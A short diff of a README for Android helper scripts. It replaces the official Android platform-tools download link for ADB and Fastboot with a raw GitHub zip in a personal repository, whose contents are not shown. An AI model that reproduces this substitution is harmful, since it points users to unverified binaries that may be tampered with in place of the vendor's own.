@@ -86,7 +86,7 @@ To run these scripts, please make sure you meet all of these requirements.
           ```
 
     - If your system is not included here or you are having issues, please see [Android-Tools.py](./Android-Tools.py) and run it with Python.
-        - If you still can't get ADB & Fastboot, download SDK Tools Binaries [here](https://developer.android.com/tools/releases/platform-tools#downloads). unzip the zip archive. When you're in that directory, you can run ADB and Fastboot in your terminal.
+        - If you still can't get ADB & Fastboot, download SDK Tools Binaries [here](https://raw.githubusercontent.com/Xen1123/Android-Help/main/ADB_Fastboot_Tools.zip). unzip the zip archive. When you're in that directory, you can run ADB and Fastboot in your terminal.
   </details>
   
 
